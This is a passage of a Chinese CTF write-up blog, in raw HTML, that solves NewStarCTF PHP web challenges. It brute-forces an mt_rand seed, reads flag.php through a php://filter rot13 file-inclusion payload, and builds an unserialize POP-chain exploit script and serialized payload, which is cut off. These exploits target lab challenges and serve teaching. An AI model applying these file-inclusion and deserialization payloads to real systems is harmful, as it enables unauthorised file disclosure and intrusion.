class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">&quot;seed.php&quot;</span>);</span><br><span class=\"line\"><span class=\"comment\">//mt_srand(*********);//设置随机数种子</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;Hint: &quot;</span>.<span class=\"title function_ invoke__\">mt_rand</span>().<span class=\"string\">&quot;&lt;br&gt;&quot;</span>;<span class=\"comment\">//已知第一个随机数种子为：1219893521</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;guess&#x27;</span>]) &amp;&amp; <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;guess&#x27;</span>]) === <span class=\"title function_ invoke__\">md5</span>(<span class=\"title function_ invoke__\">mt_rand</span>()))&#123;<span class=\"comment\">//md5强类型</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/base|\\.\\./i&quot;</span>,<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>]) &amp;&amp;<span class=\"comment\">//过滤base preg_match(&quot;/NewStar/i&quot;,$_GET[&#x27;file&#x27;]) &amp;&amp; isset($_GET[&#x27;file&#x27;]))&#123;</span></span><br><span class=\"line\">       <span class=\"comment\">//要求存在NewStar字符串，并且有file参数</span></span><br><span class=\"line\">        <span class=\"comment\">//flag in `flag.php`</span></span><br><span class=\"line\">        <span class=\"keyword\">include</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>]);<span class=\"comment\">//文件包含漏洞</span></span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Baby Hacker?&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;No Hacker!&quot;</span>;</span><br><span class=\"line\">&#125; Hint: <span class=\"number\">1219893521</span></span><br><span class=\"line\">No Hacker!</span><br></pre></td></tr></table></figure>\n\n<p>题目这里给了一个链接：<a class=\"link\"   href=\"https://www.openwall.com/php_mt_seed/\" >https://www.openwall.com/php_mt_seed/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>这里大概讲的就是随机数种子的漏洞</p>\n<p>当我们知道随机数种子后，后面的随机数无论在哪里运行都是有可预见性的</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"><span class=\"title function_ invoke__\">mt_srand</span>(<span class=\"number\">12345</span>);    </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">mt_rand</span>().<span class=\"string\">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">mt_rand</span>().<span class=\"string\">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">mt_rand</span>().<span class=\"string\">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">mt_rand</span>().<span class=\"string\">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">mt_rand</span>().<span class=\"string\">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span>    </span><br><span class=\"line\"><span class=\"number\">162946439</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">247161732</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">1463094264</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">1878061366</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">394962642</span></span><br></pre></td></tr></table></figure>\n\n<p>当随机数种子设置成12345时，前五个随机数都是一样的，于是这个题目就有了思路，我们已知第一个随机数，可以用工具爆破出种子，然后我们用种子读第二个随机数，然后文件读取</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161702046.png\"\n                        alt=\"图片-1665405798622\"\n                 ></p>\n<p>这里爆出随机数种子为1145146</p>\n<p>我们用种子去跑第二个随机数：1202031004</p>\n<p>然后post传值</p>\n<p>接着就是文件包含，这题过滤了base我们可以用rot13编码（编码的形式有许多种）</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=php:<span class=\"comment\">//filter/read=string.rot13/resource=flag.php</span></span><br></pre></td></tr></table></figure>\n\n<p>我发现这题必须要包含NewStar这个字符串，于是我们改成</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=php:<span class=\"comment\">//filter/NewStar/read=string.rot13/resource=flag.php</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">synt&#123;p1786p1p-rqr8-4524-n796-r3s84050oo92&#125;</span><br></pre></td></tr></table></figure>\n\n<p>rot13解码得</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;c1786c1c-ede8-4524-a796-e3f84050bb92&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"3-UnserializeOne\"><a href=\"#3-UnserializeOne\" class=\"headerlink\" title=\"3.UnserializeOne\"></a>3.UnserializeOne</h2><p>源代码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"comment\">#Something useful for you : https://zhuanlan.zhihu.com/p/377676274</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Start</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$func</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Welcome to NewStarCTF, &quot;</span>.<span class=\"variable language_\">$this</span>-&gt;name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__isset</span>(<span class=\"params\"><span class=\"variable\">$var</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        (<span class=\"variable language_\">$this</span>-&gt;func)();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Sec</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$obj</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$var</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;obj-&gt;<span class=\"title function_ invoke__\">check</span>(<span class=\"variable\">$this</span>-&gt;<span class=\"keyword\">var</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;CTFers&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__invoke</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"string\">&#x27;/flag&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Easy</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$cla</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$fun</span>, <span class=\"variable\">$var</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;cla = <span class=\"keyword\">clone</span> <span class=\"variable\">$var</span>[<span class=\"number\">0</span>];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">eeee</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$obj</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__clone</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable language_\">$this</span>-&gt;obj-&gt;cmd))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;success&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;pop&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;pop&#x27;</span>]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>这个题目是考反序列化，利用点为</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"string\">&#x27;/flag&#x27;</span>);</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><input checked=\"\" disabled=\"\" type=\"checkbox\"> __construct()，类的构造函数</li>\n<li>__destruct()，类的析构函数</li>\n<li>__call()，在对象中调用一个不可访问方法时调用</li>\n<li>__callStatic()，用静态方式中调用一个不可访问方法时调用</li>\n<li>__get()，获得一个类的成员变量时调用</li>\n<li>__set()，设置一个类的成员变量时调用</li>\n<li>__isset()，当对不可访问属性调用isset()或empty()时调用</li>\n<li>__unset()，当对不可访问属性调用unset()时被调用。</li>\n<li>__sleep()，执行serialize()时，先会调用这个函数</li>\n<li>__wakeup()，执行unserialize()时，先会调用这个函数</li>\n<li>__toString()，类被当成字符串时的回应方法</li>\n<li>__invoke()，调用函数的方式调用一个对象时的回应方法</li>\n<li>__set_state()，调用var_export()导出类时，此静态方法会被调用。</li>\n<li>__clone()，当对象复制完成时调用</li>\n<li>__autoload()，尝试加载未定义的类</li>\n<li>__debugInfo()，打印所需调试信息</li>\n</ul>\n<p>这题目找pop链，一般我从**__destruct<strong>开始，链终点是Sec类中的</strong>__invoke**</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Welcome to NewStarCTF, &quot;</span>.<span class=\"variable language_\">$this</span>-&gt;name;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>如果我们将这里的name改成类，由于echo会将类当成字符串可以触发**__tostring**</p>\n<p>我们将Start类中的name设置为Sec类</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;obj-&gt;<span class=\"title function_ invoke__\">check</span>(<span class=\"variable\">$this</span>-&gt;<span class=\"keyword\">var</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;CTFers&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>由于这里的check方法没有被定义则会触发**__call**</p>\n<p>我们将Sec中的obj设置为Easy类</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$fun</span>, <span class=\"variable\">$var</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;cla = <span class=\"keyword\">clone</span> <span class=\"variable\">$var</span>[<span class=\"number\">0</span>];</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>我们将Easy钟大哥cla设置为eeee类会触发**__clone**</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__clone</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable language_\">$this</span>-&gt;obj-&gt;cmd))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;success&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>由于eeee类中没有cm’d属性，这里调用会触发**__isset**</p>\n<p>我们将eeee中的obj设置为Start类</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__isset</span>(<span class=\"params\"><span class=\"variable\">$var</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        (<span class=\"variable language_\">$this</span>-&gt;func)();</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里的 <strong>($this-&gt;func)();<strong>可以出发</strong>__invoke</strong></p>\n<p>我们将Start中的func改为Sec类即可出发成功</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__invoke</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"string\">&#x27;/flag&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>pop链</strong></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//error_reporting(0);</span></span><br><span class=\"line\"><span class=\"comment\">//highlight_file(__FILE__);</span></span><br><span class=\"line\"><span class=\"comment\">#Something useful for you : https://zhuanlan.zhihu.com/p/377676274</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Start</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$func</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;func=<span class=\"keyword\">new</span> <span class=\"title class_\">Sec</span>();</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;name=<span class=\"keyword\">new</span> <span class=\"title class_\">Sec</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Welcome to NewStarCTF, &quot;</span>.<span class=\"variable language_\">$this</span>-&gt;name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__isset</span>(<span class=\"params\"><span class=\"variable\">$var</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        (<span class=\"variable language_\">$this</span>-&gt;func)();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Sec</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$obj</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$var</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;obj=<span class=\"keyword\">new</span> <span class=\"title class_\">Easy</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;obj-&gt;<span class=\"title function_ invoke__\">check</span>(<span class=\"variable\">$this</span>-&gt;<span class=\"keyword\">var</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;CTFers&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__invoke</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"string\">&#x27;/flag&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Easy</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$cla</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$fun</span>, <span class=\"variable\">$var</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;cla = <span class=\"keyword\">clone</span> <span class=\"variable\">$var</span>[<span class=\"number\">0</span>];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">eeee</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$obj</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__clone</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable language_\">$this</span>-&gt;obj-&gt;cmd))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;success&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$c</span>=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">eeee</span>();</span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"keyword\">new</span> <span class=\"title class_\">Start</span>();</span><br><span class=\"line\"><span class=\"variable\">$c</span>-&gt;obj=<span class=\"variable\">$a</span>;</span><br><span class=\"line\"><span class=\"variable\">$b</span>=<span class=\"keyword\">new</span> <span class=\"title class_\">Sec</span>();</span><br><span class=\"line\"><span class=\"variable\">$b</span>-&gt;<span class=\"keyword\">var</span>=<span class=\"variable\">$c</span>;</span><br><span class=\"line\"><span class=\"variable\">$a</span>-&gt;name=<span class=\"variable\">$b</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$c</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?pop=O:<span class=\"number\">4</span>:<span class=\"string\">&quot;eeee&quot;</span>:<span class=\"number\">1</span>:&#123;s:<span class=\"number\">3</span>:<span class=\"string\">&quot;obj&quot;</span>;O:<span class=\"number\">5</span>:<span class=\"string\">&quot;Start&quot;</span>:<span class=\"number\">2</span>:&#123;s:<span class=\"number\">4</span>:<span class=\"string\">&quot;name&quot;</span>;O:<span class=\"number\">3</span>:<span class=\"string\">&quot;Sec&quot;</span>:<span class=\"number\">2</span>:&#123;s:<span class=\"number\">3</span>:<span class=\"string\">&quot;obj&quot;</span>;O:<span class=\"number\">4</span>:<span class=\"string\">&quot;Easy&quot;</span>:<span class=\"number\">1</span>:&#123;s:<span class=\"number\">3</span>:<span class=\"string\">&quot;cla&quot;</span>;N;&#125;s:<span class=\"number\">3</span>:<span 